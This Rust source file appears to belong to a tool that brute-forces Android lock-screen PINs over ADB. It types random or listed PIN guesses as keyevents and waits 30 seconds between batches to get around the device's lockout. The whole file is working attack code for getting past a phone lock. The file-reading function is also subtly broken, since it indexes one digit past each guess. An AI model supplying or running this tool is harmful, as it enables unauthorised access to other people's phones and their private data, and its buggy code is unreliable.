use rand::thread_rng;
use rand::Rng;

use mozdevice::Device;

use std::thread::sleep;
use std::time::Duration;
use std::fs::File;
use std::io::BufRead;
use std::io::BufReader;


pub struct NPin {}


impl NPin {

    // Generate & push random pins
    pub fn random(device: &Device, length: usize) {
        // Necessary variables
        let mut comb: String = String::new();
        let mut att: u32 = 1;
        let mut ret_limit: u32 = 5;

        let mut dig: Vec<u8> = vec![0; length];


        // Wake device
        device.execute_host_shell_command("input keyevent 82").expect("Failed to execute shell command");
        sleep(Duration::from_millis(100));
        device.execute_host_shell_command("input swipe 408 1210 508 85").expect("Failed to execute shell command");
        sleep(Duration::from_millis(100));


        // Generate & push 9999 combinations
        for ret in 1..=9999 {

            // Generate random combination
            for i in 0..=50 {
                if i == length { break; }

                dig[i] = thread_rng().gen_range(0..=9);
                comb += &dig[i].to_string();  // Just for printing
                dig[i] += 7;
            }

            // Attempt limit check
            if att == 3 {
                ret_limit = 1;
                println!("Limit of 3 retries exceeded, max retries: {ret_limit}");
            }
            println!("ATTEMPT: {att}  RETRY: {ret}  COMBINATION: {comb}");

            // Push combination
            for i in 0..=50 {
                if i == length { break; }

                device.execute_host_shell_command(&format!("input keyevent {:?}", dig[i])).expect("Failed to execute command");
                sleep(Duration::from_millis(50));
            }
            comb = String::new();  // Erasing combination for printing


            // Retry limit check
            if ret % ret_limit == 0 {
                println!("Limit of {ret_limit} exceeded, waiting 30 seconds...");
                att += 1;

                // Sleep is necessary for Android to understand the input
                sleep(Duration::from_millis(80));
                device.execute_host_shell_command("input keyevent 66").expect("Failed to execute shell command");
                sleep(Duration::from_secs(30));

                // Wake device again
                device.execute_host_shell_command("input keyevent 82").expect("Failed to execute shell command");
                sleep(Duration::from_millis(100));
                device.execute_host_shell_command("input swipe 408 1210 508 85").expect("Failed to execute shell command");
                sleep(Duration::from_millis(100));
            }
        }
    }


    // Push pin combinations from list
    pub fn from_file(file: &String, device: &Device) {

        // Opening the file
        let file: File = File::open(file).expect("Failed to open PIN list file");
        let reader: BufReader<File> = BufReader::new(file);

        // Necessary variables
        let mut att: u32 = 1;
        let mut ret_limit: u32 = 5;
        let mut dig: Vec<u8> = [ 0, 0, 0, 0].to_vec();

        let mut ret: u32 = 0;


        // Wake device
        device.execute_host_shell_command("input keyevent 82").expect("Failed to execute shell command");
        sleep(Duration::from_millis(100));
        device.execute_host_shell_command("input swipe 408 1210 508 85").expect("Failed to execute shell command");
        sleep(Duration::from_millis(100));


        // Read the list line-by-line and push pins
        for (_index, line) in reader.lines().enumerate() {
            let line = line.unwrap();

            // Ignore blank lines
            if line == "" {
                continue
            };
            ret += 1;


            // Attempt limit check
            if att == 3 {
                ret_limit = 1;
                println!("Limit of 3 retries exceeded, max retries: {ret_limit}");
            }
            println!("ATTEMPT: {att}  RETRY: {ret}  COMBINATION: {line}");


            // Evil rust.
            for i in 0..=line.len() - 1 {
                let c = line.chars().nth(i).unwrap();
                let keycode = c.to_digit(10).unwrap() as u8 + 7;

                dig[i] = keycode;
            }

            // Push combination
            for i in 0..=line.len() {
                device.execute_host_shell_command(&format!("input keyevent {:?}", dig[i])).expect("Failed to execute shell command");
                sleep(Duration::from_millis(50));
            }

            // Retry limit check
            if ret % ret_limit == 0 {
                println!("Limit of {ret_limit} exceeded, waiting 30 seconds...");
                att += 1;

                // Sleep is necessary for Android to understand the input
                sleep(Duration::from_millis(80));
                device.execute_host_shell_command("input keyevent 66").expect("Failed to execute shell command");
                sleep(Duration::from_secs(30));

                // Wake device again
                device.execute_host_shell_command("input keyevent 82").expect("Failed to execute shell command");
                sleep(Duration::from_millis(100));
                device.execute_host_shell_command("input swipe 408 1210 508 85").expect("Failed to execute shell command");
                sleep(Duration::from_millis(100));
            }
        }
    }
}